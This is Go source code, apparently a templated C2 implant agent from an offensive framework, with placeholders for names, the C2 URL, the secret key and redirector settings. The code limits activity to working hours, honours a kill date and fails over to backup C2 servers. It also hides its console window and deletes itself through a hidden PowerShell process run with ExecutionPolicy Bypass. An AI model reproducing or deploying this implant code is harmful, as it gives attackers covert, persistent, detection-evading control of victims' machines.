func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_WORKING_HOURS_FUNC}() bool {
	now := time.Now()
	if a.{AGENT_WORKING_HOURS_FIELD}.Timezone == "UTC" {
		// Use UTC time
		now = now.UTC()
	} else {
		// Use local time for other timezones (for simplicity)
		// Later on, We might want to parse the timezone
	}

	// Go's Weekday: 0=Sunday, 1=Monday, 2=Tuesday, etc.
	currentWeekday := int(now.Weekday())
	if currentWeekday == 0 {
		currentWeekday = 7 // Sunday is day 7 in our config (1-7 for Monday-Sunday)
	}

	allowed := false
	for _, day := range a.{AGENT_WORKING_HOURS_FIELD}.Days {
		if day == currentWeekday {
			allowed = true
			break
		}
	}

	if !allowed {
		return false
	}

	// Check if current hour is within working hours
	currentHour := now.Hour()
	if currentHour >= a.{AGENT_WORKING_HOURS_FIELD}.StartHour && currentHour < a.{AGENT_WORKING_HOURS_FIELD}.EndHour {
		return true
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_KILL_DATE_FUNC}() bool {
	killTime, err := time.Parse("2006-01-02T15:04:05Z", a.{AGENT_KILL_DATE_FIELD})
	if err != nil {
		// If we can't parse the kill date, assume no kill date (return false to not kill)
		return false
	}

	now := time.Now().UTC()
	return now.After(killTime)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_TRY_FAILOVER_FUNC}() bool {
	if !a.{AGENT_USE_FAILOVER_FIELD} || len(a.{AGENT_FAILOVER_URLS_FIELD}) == 0 {
		return false
	}

	// Check if we should try failover based on failure count
	if a.{AGENT_CURRENT_FAIL_COUNT_FIELD} < a.{AGENT_MAX_FAIL_COUNT_FIELD} {
		return false
	}

	// Set flag to indicate we're in a failover attempt to prevent recursion
	a.{AGENT_IN_FAILOVER_ATTEMPT_FIELD} = true

	// Try to register with a failover C2
	originalC2URL := a.{AGENT_CURRENT_C2_URL_FIELD}
	for _, failoverURL := range a.{AGENT_FAILOVER_URLS_FIELD} {
		a.{AGENT_CURRENT_C2_URL_FIELD} = failoverURL

		// Try to register with the failover server
		err := a.{AGENT_REGISTER_FUNC}()
		if err == nil {
			// Successfully connected to failover C2
			a.{AGENT_CURRENT_FAIL_COUNT_FIELD} = 0  // Reset failure count
			a.{AGENT_LAST_CONNECTION_ATTEMPT_FIELD} = time.Now()
			a.{AGENT_IN_FAILOVER_ATTEMPT_FIELD} = false  // Reset the flag
			return true
		} else {
		}
	}

	// If all failover attempts failed, return to the original main C2
	a.{AGENT_CURRENT_C2_URL_FIELD} = originalC2URL
	a.{AGENT_LAST_CONNECTION_ATTEMPT_FIELD} = time.Now()
	a.{AGENT_IN_FAILOVER_ATTEMPT_FIELD} = false  // Reset the flag
	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_INCREMENT_FAIL_COUNT_FUNC}() {
	a.{AGENT_CURRENT_FAIL_COUNT_FIELD}++
	a.{AGENT_LAST_CONNECTION_ATTEMPT_FIELD} = time.Now()

	if a.{AGENT_CURRENT_FAIL_COUNT_FIELD} >= a.{AGENT_MAX_FAIL_COUNT_FIELD} && !a.{AGENT_IN_FAILOVER_ATTEMPT_FIELD} {
		a.{AGENT_TRY_FAILOVER_FUNC}()
	}
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_RESET_FAIL_COUNT_FUNC}() {
	a.{AGENT_CURRENT_FAIL_COUNT_FIELD} = 0
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_SELF_DELETE_FUNC}() {
	executable, err := os.Executable()
	if err != nil {
		os.Exit(0)
		return
	}

	go func() {
		time.Sleep(100 * time.Millisecond) // Brief delay to ensure process exits

			psCommand := fmt.Sprintf(`
				Start-Sleep -Milliseconds 500;
				$targetPath = '%s';
				$retries = 0;
				$maxRetries = 10;
				while ($retries -lt $maxRetries) {
					if (Test-Path $targetPath) {
						try {
							Remove-Item -Path $targetPath -Force -ErrorAction Stop;
							break;
						} catch {
							Start-Sleep -Milliseconds 500;
							$retries++;
						}
					} else {
						break;
					}
				}
			`, executable)

			cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", psCommand)
			cmd.Start()

		os.Exit(0)
	}()
}

func {AGENT_HIDE_CONSOLE_FUNC}() {
	consoleHandle, _, _ := procGetConsoleWindow.Call()
	if consoleHandle != 0 {
		procShowWindow.Call(
			consoleHandle,  // HWND - console window handle
			uintptr(0),     // nCmdShow - SW_HIDE constant
		)
	}

	procFreeConsole.Call()
}

func main() {
	{AGENT_HIDE_CONSOLE_FUNC}()

	agentID := "{AGENT_ID}"
	secretKey := "{SECRET_KEY}"
	c2URL := "{C2_URL}"
	redirectorHost := "{REDIRECTOR_HOST}"
	redirectorPort := {REDIRECTOR_PORT}
	useRedirector := {USE_REDIRECTOR}
	disableSandbox := {DISABLE_SANDBOX}

	agent, err := New{AGENT_STRUCT_NAME}(agentID, secretKey, c2URL, redirectorHost, redirectorPort, useRedirector, disableSandbox)
	if err != nil {
		os.Exit(1)
	}

	agent.{AGENT_RUN_FUNC}()
}